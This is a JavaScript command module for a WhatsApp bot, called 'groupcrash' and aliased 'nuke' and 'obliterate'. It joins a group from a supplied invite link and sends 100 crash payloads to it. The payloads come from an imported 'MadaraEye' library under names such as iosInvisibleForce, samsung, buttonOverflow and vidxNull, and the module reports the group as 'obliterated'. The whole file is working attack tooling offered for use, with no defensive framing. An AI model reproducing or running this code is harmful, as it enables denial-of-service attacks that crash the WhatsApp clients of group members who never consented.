'use strict';
const { MadaraEye } = require('../../lib/madaraEye');
const { createProgressBar } = require('../../lib/progressBar');

module.exports = {
    name: 'groupcrash',
    aliases: ['gcrash', 'crashgroup', 'gclink', 'groupkill', 'nuke', 'gc', 'obliterate', 'eyenuke'],
    category: 'madaraeye',
    desc: 'ᴍᴀᴅᴀʀᴀ ᴇʏᴇ — ɢʀᴏᴜᴘ ɴᴜᴋᴇ ᴠɪᴀ ʟɪɴᴋ',
    usage: '.groupcrash <group_link>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}groupcrash <group_link>\n📝 *Example:* ${prefix}groupcrash https://chat.whatsapp.com/AbCdEfGhIjKlMnOp` 
            }, { quoted: msg });
        }
        
        const link = args[0];
        
        let eye = global.getMadaraEye?.(sock);
        if (!eye) {
            eye = new MadaraEye(sock);
        }
        
        try {
            const groupJid = await sock.groupAcceptInvite(link.split('/').pop());
            if (!groupJid) throw new Error('Failed to resolve group link');
            
            const TOTAL = 100;
            const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
            
            for (let i = 0; i < 30; i++) {
                await eye.iosInvisibleForce(groupJid);
                await bar.update(1, 'ɪᴏs ғᴏʀᴄᴇ');
                await new Promise(r => setTimeout(r, 200));
            }
            
            for (let i = 0; i < 30; i++) {
                await eye.samsung(groupJid);
                await bar.update(1, 'sᴀᴍsᴜɴɢ');
                await new Promise(r => setTimeout(r, 200));
            }
            
            for (let i = 0; i < 20; i++) {
                await eye.buttonOverflow(groupJid);
                await bar.update(1, 'ʙᴜᴛᴛᴏɴ');
                await new Promise(r => setTimeout(r, 300));
            }
            
            for (let i = 0; i < 20; i++) {
                await eye.vidxNull(groupJid);
                await bar.update(1, 'ᴠɪᴅx');
                await new Promise(r => setTimeout(r, 300));
            }
            
            await bar.done(`✅ ᴍᴀᴅᴀʀᴀ ᴇʏᴇ ɢʀᴏᴜᴘ ɴᴜᴋᴇ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ɢʀᴏᴜᴘ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${groupJid}`);
        } catch (e) {
            return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
        }
    }
};